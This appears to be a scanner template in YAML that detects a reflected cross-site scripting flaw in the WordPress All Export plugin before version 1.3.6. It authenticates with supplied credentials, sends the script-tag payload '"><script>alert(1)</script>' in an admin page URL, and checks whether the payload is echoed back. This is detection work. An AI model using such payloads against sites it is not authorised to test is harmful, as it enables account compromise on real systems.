id: wp-all-export-xss
brief:
    title: WordPress All Export <1.3.6 - Cross-Site Scripting
    by: Akincibor
    level: medium
    about: WordPress All Export plugin before version 1.3.6 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
    label:
        - wp-plugin
        - xss
        - wp
        - wordpress
        - authenticated
        - wpscan
        - vuln
    score: CVSS:5.4
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/wp-login.php'
      head:
        Content-Type: application/x-www-form-urlencoded
        Cookie: wordpress_test_cookie=WP%20Cookie%20check
        Origin: '{{RootURL}}'
      body: log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      signs:
        - "on": word
          has:
            - manage&a\"><script>alert(1)</script>">
            - Manage Exports
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
    - verb: GET
      to:
        - '{{BaseURL}}/wp-admin/admin.php?page=pmxe-admin-manage&a"><script>alert(1)</script>'
      signs:
        - "on": word
          has:
            - manage&a\"><script>alert(1)</script>">
            - Manage Exports
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
